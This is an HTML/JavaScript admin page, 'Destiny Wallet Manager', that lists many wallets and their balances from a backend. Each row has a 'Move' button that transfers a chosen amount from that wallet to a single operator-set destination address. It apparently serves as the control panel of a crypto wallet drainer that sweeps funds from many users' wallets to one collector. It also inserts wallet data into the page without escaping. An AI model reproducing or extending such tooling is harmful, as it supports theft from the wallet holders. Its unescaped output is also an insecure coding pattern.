<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>üõ†Ô∏è Admin Panel ‚Äî Destiny Wallet</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
  <style>
    body {
      background: linear-gradient(to bottom right, #eef2f9, #dfe6ed);
      font-family: 'Segoe UI', sans-serif;
    }
    .navbar {
      background-color: #343a40;
    }
    .navbar-brand {
      color: #fff;
      font-weight: 600;
    }
    .navbar-brand:hover {
      color: #f8f9fa;
    }
    .btn-set {
      background: linear-gradient(135deg, #0052cc, #3a8dde);
      color: white;
      font-weight: 600;
      border: none;
    }
    .btn-set:hover {
      background: linear-gradient(135deg, #003c99, #2e79c2);
    }
    .btn-move {
      background: linear-gradient(135deg, #38a169, #2f855a);
      color: white;
      font-weight: 600;
      border: none;
    }
    .btn-move:hover {
      background: linear-gradient(135deg, #276749, #22543d);
    }
    input.form-control {
      box-shadow: 0 0 4px rgba(0, 0, 0, 0.05);
    }
    .table-striped > tbody > tr:nth-of-type(odd) {
      background-color: rgba(0, 0, 0, 0.02);
    }
    .card-glass {
      background: rgba(255, 255, 255, 0.8);
      backdrop-filter: blur(6px);
      border-radius: 14px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
      padding: 30px;
      margin-top: 30px;
    }
  </style>
</head>
<body>

  <!-- ‚úÖ Navbar -->
  <nav class="navbar navbar-expand-lg">
    <div class="container-fluid">
      <a class="navbar-brand" href="#">üíº Vortex Admin Panel</a>
    </div>
  </nav>

  <div class="container card-glass">
    <h3 class="text-center mb-4">‚öôÔ∏è Destiny Wallet Manager</h3>

    <!-- ‚úÖ Destiny Wallet Input -->
    <div class="row mb-4">
      <div class="col-md-8">
        <input type="text" id="globalDestInput" class="form-control" placeholder="Enter destination wallet address..." />
      </div>
      <div class="col-md-4">
        <button class="btn btn-set w-100" onclick="setDestAddress()">Set Destiny Address</button>
      </div>
    </div>

    <!-- ‚úÖ Destiny Status -->
    <div class="alert alert-info text-center fw-semibold" id="destStatus" style="display: none;"></div>

    <!-- ‚úÖ Total Count -->
    <div class="text-end mb-2">
      <span class="badge text-bg-secondary p-2">üìä Total Wallets: <span id="userCount">0</span></span>
    </div>

    <!-- ‚úÖ Wallet Table -->
    <div id="walletsTable"></div>
  </div>

  <script>
    let globalDest = "";

    function setDestAddress() {
      const input = document.getElementById("globalDestInput").value.trim();
      if (!input || !input.startsWith("0x") || input.length < 20) {
        alert("‚ùå Please enter a valid wallet address.");
        return;
      }

      globalDest = input;
      localStorage.setItem("destWallet", globalDest);
      showDestStatus();
    }

    function showDestStatus() {
      if (!globalDest) return;
      const statusBox = document.getElementById("destStatus");
      statusBox.style.display = "block";
      statusBox.innerHTML = `‚úÖ Destiny Wallet Set: <code>${globalDest}</code>`;
      document.getElementById("globalDestInput").value = globalDest;
    }

    async function loadWallets() {
      const res = await fetch('/wallets');
      const data = await res.json();

      document.getElementById("userCount").textContent = data.length;

      let html = `
        <table class="table table-bordered table-striped text-center">
          <thead class="table-dark">
            <tr>
              <th>#</th>
              <th>Wallet</th>
              <th>Balance</th>
              <th>Amount</th>
              <th>Action</th>
            </tr>
          </thead>
          <tbody>
      `;

      data.forEach((w, i) => {
        html += `
          <tr>
            <td>${i + 1}</td>
            <td>${w.wallet}</td>
            <td>${w.balance}</td>
            <td><input id="amt-${w.wallet}" class="form-control" placeholder="Amount" /></td>
            <td><button class="btn btn-move" onclick="transfer('${w.wallet}')">Move</button></td>
          </tr>
        `;
      });

      html += `</tbody></table>`;
      document.getElementById('walletsTable').innerHTML = html;
    }

    async function transfer(fromWallet) {
      if (!globalDest) {
        alert("‚ùó Please set Destiny Wallet address first.");
        return;
      }

      const amount = document.getElementById(`amt-${fromWallet}`).value.trim();
      if (!amount) {
        alert("‚ùó Enter amount to transfer.");
        return;
      }

      try {
        const res = await fetch('/transfer', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ fromWallet, toWallet: globalDest, amount })
        });

        const result = await res.json();
        alert(result.success ? `‚úÖ Tx Success: ${result.hash}` : `‚ùå Error: ${result.error}`);
      } catch (err) {
        console.error(err);
        alert("‚ùå Transfer failed.");
      }
    }

    window.onload = () => {
      const saved = localStorage.getItem("destWallet");
      if (saved && saved.startsWith("0x")) {
        globalDest = saved;
        showDestStatus();
      }
      loadWallets();
    };
  </script>
</body>
</html>
